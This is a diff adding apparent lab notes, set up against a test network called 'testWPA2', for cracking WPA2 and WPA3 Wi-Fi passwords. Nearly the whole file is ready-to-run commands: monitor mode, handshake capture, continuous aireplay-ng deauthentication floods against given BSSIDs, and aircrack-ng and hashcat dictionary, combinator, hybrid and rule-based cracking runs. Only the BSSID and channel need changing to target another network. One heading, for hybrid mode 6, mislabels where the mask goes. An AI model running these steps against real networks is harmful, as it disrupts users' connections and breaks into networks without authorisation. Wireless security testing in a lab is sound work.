@@ -1,0 +1,136 @@
+
+IMPORTANT COMMANDS
+------------------
+# run command as root
+sudo su root
+
+# attach TP Link device after kali loaded and wait for 1 min
+
+#  VIEW LIST OF AVAILABLE GPU/CPU NUMBERS
+>>> Most of the time two devices CPU and GPU select 1 as 
+hashcat I
+
+
+
+
+
+********************************************************************************************************
+SETTINGS
+********************************************************************************************************
+Mask		: ?u?l?l?l?l#?d?d?d
+Password	: Wjohn#654
+Description	: Strong password contain first character is capital, four lower characters and three number after # character
+WiFi Name	: testWPA2
+
+
+********************************************************************************************************
+STEP-1: Capture Handshake
+********************************************************************************************************
+Commands:
+iwconfig
+airmon-ng check
+airmon-ng check kill
+airmon-ng start wlan0
+iwconfig
+airodump-ng wlan0
+---------------------
+WPA3
+---------------------
+airodump-ng wlan0 -c 1 --bssid 26:CC:EA:D3:F6:38 -w handshakeWPA3 
+aireplay-ng --deauth 0 -a 26:CC:EA:D3:F6:38 wlan0
+
+---------------------
+WPA2
+---------------------
+airodump-ng wlan0 -c 1 --bssid 5A:AA:39:9C:C3:68 -w handshakeWPA2
+aireplay-ng --deauth 0 -a 5A:AA:39:9C:C3:68 wlan0
+
+>> Note: In above 4 lines change -c ??, --bssid ????? from your laptop
+
+
+
+********************************************************************************************************
+STEP-2: Aircrack-ng
+********************************************************************************************************
+WPA2
+----------
+aircrack-ng handshakeWPA2-01.cap -w pwdlist.txt
+
+WPA3
+----------
+aircrack-ng handshakeWPA3-01.cap -w pwdlist.txt
+
+
+********************************************************************************************************
+STEP-3: Perform attacks on handshake file
+********************************************************************************************************
+
+
+1.) Dictonary Attack
+==================================================================================================================================================
+Display passwords on the screen
+------
+hashcat --stdout ../pwdlist.txt
+
+crack password
+-----
+
+hashcat -d 1 -m 22000 -w 3 -a 0 --status ../WPA2/handshakeWPA2-01.hc22000 ../pwdlist.txt
+hashcat -d 1 -m 22000 -w 3 -a 0 --status ../WPA3/handshakeWPA3-01.cap ../pwdlist.txt
+
+
+2.) Combinator attack
+==================================================================================================================================================
+Display passwords on the screen
+----------
+hashcat --stdout -a 1 ../wordlist.txt ../wordlist2.txt
+
+crack password
+-----
+hashcat -d 1 -m 22000 -w 3 -a 1 ../WPA2/handshakeWPA2-01.hc22000 ../pwdlist.txt ../wordlist2.txt
+hashcat -d 1 -m 22000 -w 3 -a 1 ../WPA3/handshakeWPA3-01.hc22000 ../pwdlist.txt ../wordlist2.txt
+
+
+3.) Hybrid attack 
+==================================================================================================================================================
+MODE - 7 (add mask at first position)
+=========================================================================
+
+Display passwords on the screen
+----------
+hashcat --stdout -a 7 ?d ../pwdlist.txt
+hashcat --stdout -a 7 ?l ../pwdlist.txt
+
+crack password
+-----
+hashcat -d 1 -m 22000 -w 3 --status -a 7 ../WPA2/handshakeWPA2-01.hc22000 ?d ../pwdlist.txt
+hashcat -d 1 -m 22000 -w 3 --status -a 7 ../WPA3/handshakeWPA3-01.cap ?d ../pwdlist.txt
+
+
+MODE - 6 (add mask at first position)
+=========================================================================
+
+Display passwords on the screen
+----------
+hashcat --stdout -a 6 ../pwdlist.txt ?s
+hashcat --stdout -a 6 ../pwdlist.txt ?d
+hashcat --stdout -a 6 ../pwdlist.txt ?l
+
+crack password
+-----
+hashcat -d 1 -m 22000 -w 3 --status -a 6 ../WPA2/handshakeWPA2-01.hc22000 ../pwdlist.txt ?l
+hashcat -d 1 -m 22000 -w 3 --status -a 6 ../WPA3/handshakeWPA3-01.cap ../pwdlist.txt ?l
+
+
+.) Rulebased attack
+==================================================================================================================================================
+Display passwords on the screen
+----------
+hashcat --stdout -a 0  -r ../rulebased/r2.rule -r ../rulebased/r1.rule ../pwdlist.txt
+
+
+crack password
+-----
+
+hashcat -d 1 -m 22000 -w 3 --status -a 0 ../WPA2/handshakeWPA2-01.hc22000 -r ../rulebased/r2.rule -r ../rulebased/r1.rule ../pwdlist.txt                                                                            
+hashcat -d 1 -m 22000 -w 3 --status -a 0 ../WPA3/handshakeWPA3-01.cap -r ../rulebased/r2.rule -r ../rulebased/r1.rule ../pwdlist.txt
